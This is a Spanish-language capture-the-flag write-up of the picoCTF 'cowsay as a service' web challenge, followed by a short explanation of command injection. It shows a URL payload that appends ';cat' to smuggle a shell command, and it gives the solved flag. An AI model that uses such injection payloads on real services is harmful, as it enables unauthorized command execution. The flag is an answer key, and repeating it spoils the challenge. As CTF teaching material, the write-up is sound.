## Descripción 
```
Now presenting [cowsay as a service](https://caas.mars.picoctf.net/)

---

|Challenge Endpoints|
|---|
|Download index.js|[index.js](https://artifacts.picoctf.net/picoMini+by+redpwn/Web+Exploitation/caas/index.js)|
```
[](https://github.com/armandoportillo0101/Seguridad-de-Redes/blob/main/Plantilla.md#objetivo)
## Solución
```
Ejecuté el comando “ [https://caas.mars.picoctf.net/cowsay/h](https://caas.mars.picoctf.net/cowsay/h) i”: 
 ____
< hi >
 ----
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
ejecute `ls`y obtuve este resultado:
Cow files in /usr/share/cowsay/cows:
apt bud-frogs bunny calvin cheese cock cower daemon default dragon
dragon-and-cow duck elephant elephant-in-snake eyes flaming-sheep
ghostbusters gnu hellokitty kangaroo kiss koala kosh luke-koala
mech-and-cow milk moofasa moose pony pony-smaller ren sheep skeleton
snowman stegosaurus stimpy suse three-eyes turkey turtle tux unipony
unipony-smaller vader vader-koala www.
Entoces hay una inyección de comando, por lo que coloque lo siguiente:
https://caas.mars.picoctf.net/cowsay/hi;%20cat%20falg.txt y obtuve: 
 ____
< hi >
 ----
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}
Y listo encontramos la bandera.


flag:picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}

```
[](https://github.com/armandoportillo0101/Seguridad-de-Redes/blob/main/Plantilla.md#soluci%C3%B3n)

## Notas Adicionales
¿Qué es una inyección de comando?

La inyección de comandos es un ataque cuyo objetivo es la ejecución de comandos arbitrarios en el sistema operativo host a través de una aplicación vulnerable. Los ataques de inyección de comandos son posibles cuando una aplicación pasa datos no seguros proporcionados por el usuario (formularios, cookies, encabezados HTTP, etc.) a un shell del sistema. En este ataque, los comandos del sistema operativo proporcionados por el atacante se ejecutan generalmente con los privilegios de la aplicación vulnerable. Los ataques de inyección de comandos son posibles en gran medida debido a una validación de entrada insuficiente.
[](https://github.com/armandoportillo0101/Seguridad-de-Redes/blob/main/Plantilla.md#notas-adicionales)

### Referencias